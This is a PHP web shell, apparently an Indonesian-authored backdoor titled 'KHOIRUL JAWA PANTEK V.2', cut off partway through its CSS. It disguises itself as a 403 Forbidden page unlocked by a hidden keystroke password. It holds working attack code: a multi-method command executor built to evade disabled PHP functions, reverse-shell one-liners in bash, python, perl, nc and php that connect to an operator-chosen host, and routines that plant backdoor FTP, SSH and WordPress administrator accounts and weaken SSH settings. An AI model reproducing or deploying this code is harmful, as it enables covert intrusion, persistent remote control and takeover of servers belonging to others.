<?php
// Enable error logging dan display untuk debug
ini_set('display_errors', 1); // Sementara untuk debug, matikan di produksi
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/php_errors.log');
error_reporting(E_ALL);

// Periksa apakah sesi dapat dimulai
if (!session_start()) {
    error_log("Failed to start session");
    header('HTTP/1.1 500 Internal Server Error');
    echo "<h1>500 Internal Server Error</h1><p>Session failed to start.</p>";
    exit;
}

set_time_limit(0);

$auth_hash = '8330bb7048cfd3f5972471b14e58ff89';

if (isset($_POST['stealth_pass'])) {
    $input = $_POST['stealth_pass'];
    if (md5($input) === $auth_hash) {
        $_SESSION['ok'] = true;
        echo 'OK';
    } else {
        echo 'FAIL';
    }
    exit;
}

if (!isset($_SESSION['ok'])) {
    header('HTTP/1.1 403 Forbidden');
    echo "<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body>";
    echo "<h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p>";
    echo "</body></html>";

    echo '
    <script>
    let trigger = false;
    let typed = "";
    document.addEventListener("keydown", function(e) {
        if (e.ctrlKey && e.altKey && e.key.toLowerCase() === "s") {
            trigger = true;
            typed = "";
            console.log("🟢 Stealth mode aktif. Ketik password langsung.");
        } else if (trigger) {
            if (e.key === "Enter") {
                fetch(location.href, {
                    method: "POST",
                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
                    body: "stealth_pass=" + encodeURIComponent(typed)
                }).then(r => r.text()).then(res => {
                    if (res === "OK") location.reload();
                    else {
                        alert("❌ Password salah!");
                        trigger = false;
                    }
                });
                typed = "";
            } else if (e.key.length === 1) {
                typed += e.key;
            }
        }
    });
    </script>';
    exit;
}

try {
    $cwd = '/';
    $dir = isset($_GET['path']) ? $_GET['path'] : $cwd;
    $dir = realpath($dir);
    if ($dir === false || !is_dir($dir)) {
        throw new Exception("❌ Invalid path.");
    }

    // Set direktori kerja sesi
    if (!isset($_SESSION['cwd']) || !is_dir($_SESSION['cwd'])) {
        $_SESSION['cwd'] = getcwd();
    }

    function formatSize($sizeVal) {
        $units = array('B', 'KB', 'MB', 'GB', 'TB');
        $i = 0;
        while ($sizeVal >= 1024 && $i < count($units) - 1) {
            $sizeVal /= 1024;
            $i++;
        }
        return round($sizeVal, 2) . ' ' . $units[$i];
    }

    function perms($file) {
        return substr(sprintf('%o', fileperms($file)), -4);
    }

    function get_current_path_links($path) {
        $parts = explode('/', trim($path, '/'));
        $links = array();
        $cumulative = '';
        foreach ($parts as $part) {
            $cumulative .= '/' . $part;
            $links[] = "<a href='?path=" . urlencode($cumulative) . "'>" . htmlspecialchars($part) . "</a>";
        }
        return implode(' / ', $links);
    }

    function get_md5($file) {
        return is_file($file) ? md5_file($file) : '-';
    }

    function get_time($file, $type = 'modified') {
        $time = $type === 'created' ? filectime($file) : filemtime($file);
        return date("Y-m-d H:i:s", $time);
    }

    function zip_folder($folder, $zipfile) {
        if (!class_exists('ZipArchive')) {
            error_log("ZipArchive not available");
            return false;
        }
        try {
            $zip = new ZipArchive();
            if ($zip->open($zipfile, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                $folder = realpath($folder);
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($folder),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $name => $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($folder) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
                $zip->close();
                return true;
            }
            return false;
        } catch (Exception $e) {
            error_log("Zip folder error: " . $e->getMessage());
            return false;
        }
    }

    // Super Bypass Command Executor
    function superBypassCmd($cmd, $method = 'auto') {
        global $dir;
        $output = '';
        $success = false;
        $log = [];
        $methods = ($method === 'auto') ? [
            'shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open', 'backtick',
            'file_exec', 'com_exec'
        ] : [$method];

        foreach ($methods as $m) {
            try {
                switch ($m) {
                    case 'shell_exec':
                        if (function_exists('shell_exec')) {
                            $output = @shell_exec($cmd . " 2>&1");
                            if ($output !== null && $output !== '') {
                                $log[] = "shell_exec succeeded";
                                $success = true;
                                return ['output' => $output, 'method' => 'shell_exec', 'log' => $log];
                            }
                        }
                        $log[] = "shell_exec failed or disabled";
                        break;

                    case 'exec':
                        if (function_exists('exec')) {
                            @exec($cmd . " 2>&1", $output_arr);
                            $output = implode("\n", $output_arr);
                            if (!empty($output)) {
                                $log[] = "exec succeeded";
                                $success = true;
                                return ['output' => $output, 'method' => 'exec', 'log' => $log];
                            }
                        }
                        $log[] = "exec failed or disabled";
                        break;

                    case 'system':
                        if (function_exists('system')) {
                            ob_start();
                            @system($cmd . " 2>&1");
                            $output = ob_get_clean();
                            if (!empty($output)) {
                                $log[] = "system succeeded";
                                $success = true;
                                return ['output' => $output, 'method' => 'system', 'log' => $log];
                            }
                        }
                        $log[] = "system failed or disabled";
                        break;

                    case 'passthru':
                        if (function_exists('passthru')) {
                            ob_start();
                            @passthru($cmd . " 2>&1");
                            $output = ob_get_clean();
                            if (!empty($output)) {
                                $log[] = "passthru succeeded";
                                $success = true;
                                return ['output' => $output, 'method' => 'passthru', 'log' => $log];
                            }
                        }
                        $log[] = "passthru failed or disabled";
                        break;

                    case 'popen':
                        if (function_exists('popen')) {
                            $handle = @popen($cmd . " 2>&1", 'r');
                            if ($handle) {
                                while (!feof($handle)) {
                                    $output .= fread($handle, 4096);
                                }pclose($handle);
                                if (!empty($output)) {
                                    $log[] = "popen succeeded";
                                    $success = true;
                                    return ['output' => $output, 'method' => 'popen', 'log' => $log];
                                }
                            }
                        }
                        $log[] = "popen failed or disabled";
                        break;

                    case 'proc_open':
                        if (function_exists('proc_open')) {
                            $descriptors = [
                                1 => ['pipe', 'w'],
                                2 => ['pipe', 'w']
                            ];
                            $process = @proc_open($cmd, $descriptors, $pipes);
                            if (is_resource($process)) {
                                $output = stream_get_contents($pipes[1]);
                                $error = stream_get_contents($pipes[2]);
                                fclose($pipes[1]);
                                fclose($pipes[2]);
                                proc_close($process);
                                if (!empty($output) || !empty($error)) {
                                    $log[] = "proc_open succeeded";
                                    $success = true;
                                    return ['output' => $output . $error, 'method' => 'proc_open', 'log' => $log];
                                }
                            }
                        }
                        $log[] = "proc_open failed or disabled";
                        break;

                    case 'backtick':
                        if (function_exists('shell_exec')) {
                            $output = `$cmd 2>&1`;
                            if (!empty($output)) {
                                $log[] = "backtick succeeded";
                                $success = true;
                                return ['output' => $output, 'method' => 'backtick', 'log' => $log];
                            }
                        }
                        $log[] = "backtick skipped: shell_exec disabled";
                        break;

                    case 'file_exec':
                        if (function_exists('shell_exec') && is_writable($dir)) {
                            $temp_file = $dir . '/tmp_' . uniqid() . '.sh';
                            if (file_put_contents($temp_file, "#!/bin/bash\n$cmd > /dev/null 2>&1")) {
                                chmod($temp_file, 0755);
                                $output = @shell_exec($temp_file . " 2>&1");
                                @unlink($temp_file);
                                if ($output !== null && $output !== '') {
                                    $log[] = "file_exec succeeded";
                                    $success = true;
                                    return ['output' => $output, 'method' => 'file_exec', 'log' => $log];
                                }
                            }
                            $log[] = "file_exec failed or write permission denied";
                        } else {
                            $log[] = "file_exec skipped: shell_exec disabled or directory not writable";
                        }
                        break;

                    case 'com_exec':
                        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && extension_loaded('com_dotnet')) {
                            try {
                                $shell = new COM('WScript.Shell');
                                $exec = $shell->Run("cmd.exe /C $cmd", 0, true);
                                $output = $exec;
                                if (!empty($output)) {
                                    $log[] = "com_exec succeeded";
                                    $success = true;
                                    return ['output' => $output, 'method' => 'com_exec', 'log' => $log];
                                }
                            } catch (Exception $e) {
                                $log[] = "com_exec failed: " . $e->getMessage();
                            }
                        }
                        $log[] = "com_exec skipped: not Windows or COM not enabled";
                        break;
                }
            } catch (Exception $e) {
                $log[] = "Method $m failed: " . $e->getMessage();
                $output .= "⚠️ Method $m failed: " . htmlspecialchars($e->getMessage()) . "\n";
                error_log("superBypassCmd error in method $m: " . $e->getMessage());
            }
        }

        $output = $output ?: "❌ All command execution methods failed.\nDebug Log:\n" . implode("\n", $log);
        return ['output' => $output, 'method' => 'none', 'log' => $log];
    }

    // Handle AJAX request for command execution
    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest' && isset($_POST['cmd_exec'])) {
        try {
            $cmd = trim($_POST['cmd']);
            $method = isset($_POST['cmd_method']) ? $_POST['cmd_method'] : 'auto';
            
            if (preg_match('/^cd\s*(.*)$/', $cmd, $match)) {
                $target = trim($match[1]);
                if ($target === '' || $target === '~') {
                    $output = "✅ Stay in current directory: " . $_SESSION['cwd'];
                } elseif ($target === '-') {
                    $_SESSION['cwd'] = dirname($_SESSION['cwd']);
                    $output = "✅ Changed to: " . $_SESSION['cwd'];
                } else {
                    $newPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $target);
                    if ($newPath && is_dir($newPath)) {
                        $_SESSION['cwd'] = $newPath;
                        $output = "✅ Changed to: $newPath";
                    } else {
                        $output = "⚠️ Directory not found or invalid: $target";
                    }
                }
                echo htmlspecialchars($output);
            } else {
                $exec = "cd " . escapeshellarg($_SESSION['cwd']) . " && $cmd 2>&1";
                $result = superBypassCmd($exec, $method);
                echo htmlspecialchars($result['output']);
            }
        } catch (Exception $e) {
            error_log("CMD executor error: " . $e->getMessage());
            echo "❌ Command execution failed: " . htmlspecialchars($e->getMessage());
        }
        exit;
    }

    $upload_output = "";
    $redirectPath = isset($_REQUEST['path']) ? $_REQUEST['path'] : $dir;

    // Create File
    if (isset($_POST['create_file']) && !empty($_POST['new_file_name'])) {
        try {
            if (!is_writable($dir)) {
                throw new Exception("Directory not writable");
            }
            $filename = $dir . "/" . basename($_POST['new_file_name']);
            if (!file_exists($filename)) {
                file_put_contents($filename, "");
                echo "✅ File created: " . htmlspecialchars($filename) . "<br>";
            } else {
                echo "⚠️ File already exists.<br>";
            }
        } catch (Exception $e) {
            error_log("Create file error: " . $e->getMessage());
            echo "❌ Failed to create file: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Create Directory
    if (isset($_POST['create_dir']) && !empty($_POST['new_dir_name'])) {
        try {
            if (!is_writable($dir)) {
                throw new Exception("Directory not writable");
            }
            $dirname = $dir . "/" . basename($_POST['new_dir_name']);
            if (!file_exists($dirname)) {
                mkdir($dirname);
                echo "✅ Directory created: " . htmlspecialchars($dirname) . "<br>";
            } else {
                echo "⚠️ Directory already exists.<br>";
            }
        } catch (Exception $e) {
            error_log("Create dir error: " . $e->getMessage());
            echo "❌ Failed to create directory: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Upload File
    if (isset($_FILES['upload'])) {
        try {
            if (!is_writable($dir)) {
                throw new Exception("Directory not writable");
            }
            $dest = $dir . "/" . basename($_FILES['upload']['name']);
            if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
                $upload_output .= "✅ Uploaded to $dest<br>";
            } else {
                $upload_output .= "❌ Upload failed<br>";
            }
        } catch (Exception $e) {
            error_log("Upload file error: " . $e->getMessage());
            echo "❌ Upload failed: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Save File
    if (isset($_POST['savefile']) && isset($_POST['content'])) {
        try {
            if (!is_writable($_POST['savefile'])) {
                throw new Exception("File not writable");
            }
            file_put_contents($_POST['savefile'], $_POST['content']);
            echo "<b>✅ File saved:</b> " . htmlspecialchars($_POST['savefile']) . "<br>";
        } catch (Exception $e) {
            error_log("Save file error: " . $e->getMessage());
            echo "❌ Failed to save file: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Rename File/Folder
    if (isset($_POST['rename']) && isset($_POST['newname'])) {
        try {
            if (!is_writable(dirname($_POST['rename']))) {
                throw new Exception("Directory not writable");
            }
            rename($_POST['rename'], dirname($_POST['rename']) . '/' . $_POST['newname']);
            header("Location: ?path=" . urlencode($redirectPath));
            exit;
        } catch (Exception $e) {
            error_log("Rename error: " . $e->getMessage());
            echo "❌ Failed to rename: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // CHMOD File
    if (isset($_POST['chmod']) && isset($_POST['chmod_file'])) {
        try {
            if (!is_writable($_POST['chmod_file'])) {
                throw new Exception("File not writable");
            }
            chmod($_POST['chmod_file'], octdec($_POST['chmod']));
            header("Location: ?path=" . urlencode($redirectPath));
            exit;
        } catch (Exception $e) {
            error_log("CHMOD error: " . $e->getMessage());
            echo "❌ Failed to change permissions: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Delete File
    if (isset($_GET['del']) && is_file($_GET['del'])) {
        try {
            if (!is_writable($_GET['del'])) {
                throw new Exception("File not writable");
            }
            unlink($_GET['del']);
            header("Location: ?path=" . urlencode(dirname($_GET['del'])));
            exit;
        } catch (Exception $e) {
            error_log("Delete file error: " . $e->getMessage());
            echo "❌ Failed to delete file: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Download File
    if (isset($_GET['download']) && is_file($_GET['download'])) {
        try {
            $file = realpath($_GET['download']);
            if ($file && strpos($file, realpath($dir)) === 0) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            } else {
                echo "❌ Invalid file path.<br>";
            }
        } catch (Exception $e) {
            error_log("Download file error: " . $e->getMessage());
            echo "❌ Failed to download file: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Delete Selected Files
    if (isset($_POST['delete_selected']) && isset($_POST['selected_files']) && is_array($_POST['selected_files'])) {
        try {
            $deleted = 0;
            foreach ($_POST['selected_files'] as $file) {
                $file = realpath($file);
                if ($file && strpos($file, realpath($dir)) === 0) {
                    if (is_file($file) && is_writable($file)) {
                        unlink($file);
                        $deleted++;
                    } elseif (is_dir($file) && is_writable($file)) {
                        if (@rmdir($file)) {
                            $deleted++;
                        }
                    }
                }
            }
            echo "✅ $deleted file(s)/folder(s) deleted.<br>";
            header("Location: ?path=" . urlencode($redirectPath));
            exit;
        } catch (Exception $e) {
            error_log("Delete selected error: " . $e->getMessage());
            echo "❌ Failed to delete selected files: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Extract ZIP
    if (isset($_GET['extract'])) {
        try {
            if (!class_exists('ZipArchive')) {
                throw new Exception("ZipArchive not available");
            }
            $zip = new ZipArchive();
            if ($zip->open($_GET['extract']) === TRUE) {
                if (is_writable(dirname($_GET['extract']))) {
                    $zip->extractTo(dirname($_GET['extract']));
                    $zip->close();
                    echo "✅ Extracted: " . htmlspecialchars($_GET['extract']) . "<br>";
                } else {
                    throw new Exception("Destination directory not writable");
                }
            } else {
                throw new Exception("Failed to open ZIP file");
            }
        } catch (Exception $e) {
            error_log("Extract ZIP error: " . $e->getMessage());
            echo "❌ Failed to extract ZIP: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Zip Folder
    if (isset($_POST['zip_folder']) && !empty($_POST['zip_target'])) {
        try {
            if (!is_writable($dir)) {
                throw new Exception("Directory not writable");
            }
            $target = $_POST['zip_target'];
            $zipname = $target . ".zip";
            if (zip_folder($target, $zipname)) {
                echo "✅ Folder zipped: $zipname<br>";
            } else {
                throw new Exception("Failed to create ZIP file");
            }
        } catch (Exception $e) {
            error_log("Zip folder error: " . $e->getMessage());
            echo "❌ Failed to zip folder: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Auto Spawn Shell Killer
    if (isset($_POST['spawn_killer'])) {
        try {
            $script = "#!/bin/bash\n\necho \"=== 🔥 Kill Respawn Shell Script ===\"\necho \"[*] Mendeteksi proses mencurigakan...\"\n\nPATTERN=\"bash|sh|php|perl|python|nc|ncat|curl|wget\"\n\nSUSPECTS=$(ps -eo pid,cmd --no-headers | grep -E \"$PATTERN\" | grep -vE 'grep|scanner|kill_respawn')\n\necho \"$SUSPECTS\" | while read -r pid cmd; do\n    if [[ \$pid =~ ^[0-9]+$ ]]; then\n        echo \"→ Membunuh PID \$pid (\$cmd)\"\n        kill -9 \"\$pid\"\n\n        sleep 1\n        if pgrep -f \"\$cmd\" > /dev/null; then\n            echo \"⚠️ RESPWAN TERDETEKSI: \$cmd\"\n            echo \"→ Parent chain:\"\n            pstree -sp \$(pgrep -f \"\$cmd\" | head -n 1) 2>/dev/null\n        else\n            echo \"✅ Berhasil dihentikan: \$cmd\"\n        fi\n    fi\ndone\n\necho -e \"\\n=== 🧩 Pemeriksaan Tambahan ===\"\n\necho \"[+] Cron jobs (user):\"\ncrontab -l 2>/dev/null || echo \"Tidak ada cron user.\"\n\necho -e \"\\n[+] Cron global:\"\nls -la /etc/cron* /var/spool/cron 2>/dev/null\n\necho -e \"\\n[+] systemd services aktif:\"\nsystemctl list-units --type=service --state=running | grep -Ev 'ssh|systemd|dbus|network'\n\necho -e \"\\n[+] Autorun: ~/.bashrc, ~/.profile, /etc/rc.local\"\ngrep -EHn \"$PATTERN\" ~/.bashrc ~/.profile /etc/rc.local 2>/dev/null\n\necho -e \"\\n=== Selesai. Jika tetap respawn, lanjut pantau file di direktori tertentu.\\n\"";
            if (isset($_POST['save_killer'])) {
                if (!is_writable($dir)) {
                    throw new Exception("Directory not writable");
                }
                $filename = $dir . "/kill_respawn.sh";
                if (file_put_contents($filename, $script)) {
                    chmod($filename, 0755);
                    echo "✅ Shell killer script saved as: " . htmlspecialchars($filename) . "<br>";
                } else {
                    throw new Exception("Failed to write script file");
                }
            } else {
                $result = superBypassCmd($script);
                echo "<pre style='background:#000;color:#0f0;padding:10px;'>Command: Auto Spawn Shell Killer\nMethod: " . htmlspecialchars($result['method']) . "\n=======================\n" . htmlspecialchars($result['output']) . "</pre>";
            }
        } catch (Exception $e) {
            error_log("Shell killer error: " . $e->getMessage());
            echo "❌ Shell killer execution failed: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Backconnect
    if (isset($_POST['backconnect']) && !empty($_POST['bc_ip']) && !empty($_POST['bc_port']) && !empty($_POST['bc_method'])) {
        try {
            $ip = trim($_POST['bc_ip']);
            $port = (int) $_POST['bc_port'];
            $method = trim($_POST['bc_method']);

            if (!preg_match('/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/', $ip) || $port < 1 || $port > 65535) {
                throw new Exception("Invalid IP or port");
            }

            switch ($method) {
                case 'bash':
                    $cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1 > /dev/null 2>&1 &";
                    break;
                case 'python':
                    $cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > /dev/null 2>&1 &";
                    break;
                case 'perl':
                    $cmd = "perl -e 'use Socket;\$i=\"$ip\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");' > /dev/null 2>&1 &";
                    break;
                case 'nc':
                    $cmd = "nc -e /bin/sh $ip $port > /dev/null 2>&1 &";
                    break;
                case 'php':
                    $cmd = '<?php $sock=fsockopen("'.$ip.'",'.$port.');exec("/bin/sh -i <&3 >&3 2>&3");?>';
                    if (!is_writable($dir)) {
                        throw new Exception("Directory not writable");
                    }
                    $temp_file = $dir . '/tmp_' . uniqid() . '.php';
                    file_put_contents($temp_file, $cmd);
                    $cmd = "php $temp_file > /dev/null 2>&1 &";
                    break;
                default:
                    throw new Exception("Invalid backconnect method");
            }

            $result = superBypassCmd($cmd);
            echo "<pre style='background:#000;color:#0f0;padding:10px;'>Command: Backconnect ($method): $ip:$port\nMethod: " . htmlspecialchars($result['method']) . "\n=======================\n" . htmlspecialchars($result['output']) . "</pre>";
            if ($method === 'php') {
                @unlink($temp_file);
            }
        } catch (Exception $e) {
            error_log("Backconnect error: " . $e->getMessage());
            echo "❌ Backconnect failed: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Auto Add FTP
    if (isset($_POST['add_ftp']) && !empty($_POST['ftp_username']) && !empty($_POST['ftp_password'])) {
        try {
            $username = trim($_POST['ftp_username']);
            $password = trim($_POST['ftp_password']);
            $home_dir = !empty($_POST['ftp_dir']) ? trim($_POST['ftp_dir']) : $dir;

            if (!preg_match('/^[a-zA-Z0-9_-]+$/', $username) || !is_dir($home_dir)) {
                throw new Exception("Invalid username or directory");
            }

            $ftp_daemon = '';
            $check_vsftpd = superBypassCmd('which vsftpd');
            if (strpos($check_vsftpd['output'], 'vsftpd') !== false) {
                $ftp_daemon = 'vsftpd';
            } else {
                $check_proftpd = superBypassCmd('which proftpd');
                if (strpos($check_proftpd['output'], 'proftpd') !== false) {
                    $ftp_daemon = 'proftpd';
                }
            }

            if ($ftp_daemon) {
                $cmd = "useradd -d " . escapeshellarg($home_dir) . " -s /bin/false $username > /dev/null 2>&1";
                $result = superBypassCmd($cmd);
                if ($result['method'] !== 'none') {
                    $cmd = "echo " . escapeshellarg($password) . " | passwd --stdin $username > /dev/null 2>&1";
                    superBypassCmd($cmd);

                    if ($ftp_daemon === 'vsftpd') {
                        $cmd = "echo $username >> /etc/vsftpd.userlist";
                        superBypassCmd($cmd);
                        $cmd = "service vsftpd restart > /dev/null 2>&1";
                        superBypassCmd($cmd);
                    } elseif ($ftp_daemon === 'proftpd') {
                        $cmd = "echo $username >> /etc/proftpd/proftpd.conf";
                        superBypassCmd($cmd);
                        $cmd = "service proftpd restart > /dev/null 2>&1";
                        superBypassCmd($cmd);
                    }

                    echo "<pre style='background:#000;color:#0f0;padding:10px;'>Command: Add FTP user: $username\nMethod: " . htmlspecialchars($result['method']) . "\n=======================\n✅ FTP user '$username' added with home directory: $home_dir</pre>";
                } else {
                    echo "<pre style='background:#000;color:#0f0;padding:10px;'>Command: Add FTP user: $username\nMethod: none\n=======================\n❌ Failed to add FTP user. Debug: " . htmlspecialchars($result['output']) . "</pre>";
                }
            } else {
                echo "<pre style='background:#000;color:#0f0;padding:10px;'>❌ No supported FTP daemon found (vsftpd/proftpd).</pre>";
            }
        } catch (Exception $e) {
            error_log("Add FTP error: " . $e->getMessage());
            echo "❌ Failed to add FTP user: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Auto Add SSH
    if (isset($_POST['add_ssh']) && !empty($_POST['ssh_username'])) {
        try {
            $username = trim($_POST['ssh_username']);
            $password = !empty($_POST['ssh_password']) ? trim($_POST['ssh_password']) : '';
            $pubkey = !empty($_POST['ssh_pubkey']) ? trim($_POST['ssh_pubkey']) : '';
            $shell = !empty($_POST['ssh_shell']) ? trim($_POST['ssh_shell']) : '/bin/bash';

            if (!preg_match('/^[a-zA-Z0-9_-]+$/', $username)) {
                throw new Exception("Invalid username");
            }

            $check_sshd = superBypassCmd('service sshd status');
            if (strpos($check_sshd['output'], 'running') === false) {
                echo "<pre style='background:#000;color:#0f0;padding:10px;'>❌ SSH daemon not running.</pre>";
            } else {
                $cmd = "useradd -m -s " . escapeshellarg($shell) . " $username > /dev/null 2>&1";
                $result = superBypassCmd($cmd);
                if ($result['method'] !== 'none') {
                    if ($password) {
                        $cmd = "echo " . escapeshellarg($password) . " | passwd --stdin $username > /dev/null 2>&1";
                        superBypassCmd($cmd);
                    }

                    if ($pubkey && preg_match('/^ssh-(rsa|ed25519) [A-Za-z0-9+\/=]+/', $pubkey)) {
                        $home_dir = "/home/$username";
                        $ssh_dir = "$home_dir/.ssh";
                        $auth_keys = "$ssh_dir/authorized_keys";
                        $cmd = "mkdir -p $ssh_dir && echo " . escapeshellarg($pubkey) . " > $auth_keys && chmod 700 $ssh_dir && chmod 600 $auth_keys && chown $username:$username -R $ssh_dir > /dev/null 2>&1";
                        superBypassCmd($cmd);
                    }

                    if ($password) {
                        $cmd = "sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config > /dev/null 2>&1";
                        superBypassCmd($cmd);
                        $cmd = "service sshd restart > /dev/null 2>&1";
                        superBypassCmd($cmd);
                    }

                    echo "<pre style='background:#000;color:#0f0;padding:10px;'>Command: Add SSH user: $username\nMethod: " . htmlspecialchars($result['method']) . "\n=======================\n✅ SSH user '$username' added" . ($password ? " with password" : "") . ($pubkey ? " with public key" : "") . "</pre>";
                } else {
                    echo "<pre style='background:#000;color:#0f0;padding:10px;'>Command: Add SSH user: $username\nMethod: none\n=======================\n❌ Failed to add SSH user. Debug: " . htmlspecialchars($result['output']) . "</pre>";
                }
            }
        } catch (Exception $e) {
            error_log("Add SSH error: " . $e->getMessage());
            echo "❌ Failed to add SSH user: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Download File from URL
    if (isset($_POST['download_url'])) {
        try {
            if (!is_writable($dir)) {
                throw new Exception("Directory not writable");
            }
            $url = $_POST['download_url'];
            $target = $dir . '/' . basename(parse_url($url, PHP_URL_PATH));
            if (function_exists('curl_init')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $data = curl_exec($ch);
                if ($data !== false && curl_getinfo($ch, CURLINFO_HTTP_CODE) == 200) {
                    file_put_contents($target, $data);
                    echo "✅ File downloaded: $target<br>";
                } else {
                    throw new Exception("Failed to download file");
                }
                curl_close($ch);
            } else {
                throw new Exception("cURL not available");
            }
        } catch (Exception $e) {
            error_log("Download URL error: " . $e->getMessage());
            echo "❌ Download failed: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // Add WordPress User
    if (isset($_POST['wp_add_user']) && !empty($_POST['wp_username']) && !empty($_POST['wp_password']) && !empty($_POST['wp_email'])) {
        try {
            $wp_load_path = $dir . '/wp-load.php';
            if (file_exists($wp_load_path)) {
                require_once($wp_load_path);
                if (function_exists('wp_create_user')) {
                    $new_username = trim($_POST['wp_username']);
                    $new_password = trim($_POST['wp_password']);
                    $new_email = trim($_POST['wp_email']);
                    if (!username_exists($new_username) && !email_exists($new_email)) {
                        $user_id = wp_create_user($new_username, $new_password, $new_email);
                        if (!is_wp_error($user_id)) {
                            $user = new WP_User($user_id);
                            $user->set_role('administrator');
                            echo "✅ WordPress user '$new_username' created successfully.<br>";
                        } else {
                            throw new Exception("Failed to create WordPress user: " . $user_id->get_error_message());
                        }
                    } else {
                        throw new Exception("User or email already exists");
                    }
                } else {
                    throw new Exception("WordPress functions not loaded");
                }
            } else {
                throw new Exception("wp-load.php not found in current directory");
            }
        } catch (Exception $e) {
            error_log("WordPress user error: " . $e->getMessage());
            echo "❌ Failed to add WordPress user: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // File Viewer
    if (isset($_GET['view']) && is_file($_GET['view'])) {
        try {
            $file = $_GET['view'];
            if (!is_readable($file)) {
                throw new Exception("File not readable");
            }
            $content = htmlspecialchars(file_get_contents($file));
            $perm = perms($file);
            echo "<h3>📄 File Viewer: " . basename($file) . "</h3>";
            echo "<form method='POST'>
            <textarea name='content' style='width:100%;height:400px;background:#111;color:#0f0;'>$content</textarea><br>
            <input type='submit' name='save' value='💾 Save' style='padding:10px;background:#0f0;color:#000;font-weight:bold;'>
            <input type='hidden' name='savefile' value='" . htmlspecialchars($file) . "'>
            </form><br>";

            echo "<form method='POST' style='display:inline;'>
                <input type='hidden' name='chmod_file' value='" . htmlspecialchars($file) . "'>
                <input type='hidden' name='path' value='" . htmlspecialchars($dir) . "'>
                <input type='text' name='chmod' value='$perm' size='4'>
                <input type='submit' value='CHMOD'>
            </form>
             
            <form method='POST' style='display:inline;'>
                <input type='hidden' name='rename' value='" . htmlspecialchars($file) . "'>
                <input type='hidden' name='path' value='" . htmlspecialchars($dir) . "'>
                <input type='text' name='newname' value='" . basename($file) . "'>
                <input type='submit' value='Rename'>
            </form>
             
            <a href='?path=" . htmlspecialchars(dirname($file)) . "' style='color:#0af;'>🔙 Back</a>";
            exit;
        } catch (Exception $e) {
            error_log("File viewer error: " . $e->getMessage());
            echo "❌ Failed to view file: " . htmlspecialchars($e->getMessage()) . "<br>";
        }
    }

    // List Files
    $search = isset($_GET['search']) ? $_GET['search'] : '';
    $files = scandir($dir);
    $folders = $filelist = [];
    foreach ($files as $f) {
        if ($f === "." || $f === "..") continue;
        if (is_dir("$dir/$f")) $folders[] = $f;
        else $filelist[] = $f;
    }
    natcasesort($folders);
    natcasesort($filelist);
    $files = array_merge($folders, $filelist);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>KHOIRUL JAWA PANTEK V.2 By Susu</title>
    <style>
      body {
    background-image: url('https://pub-5aefe5b9063e4c45869d74a6562c0a9b.r2.dev/Screenshot_35.png');
    background-size: contain;
    background-repeat: repeat-y;
    background-position: center;
    font-family: monospace;
    margin: 0;
    padding: 20px;
    background-color: #111;
}
        .main-content {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            margin: auto;
        }
        .window {
            background-color: rgba(0, 0, 0, 0.5);color: #0f0;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        #terminal {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 10px;
            border-radius: 5px;
        }
        #terminal-output {
            background-color: #000;
            color: #0f0;
            font-family: monospace;
            height: 200px;
            overflow-y: scroll;
            padding: 10px;
            border: 1px solid #0f0;
            margin-bottom: 10px;
        }
        #cmdInput {
            background: transparent;
            color: #0f0;
            border: none;
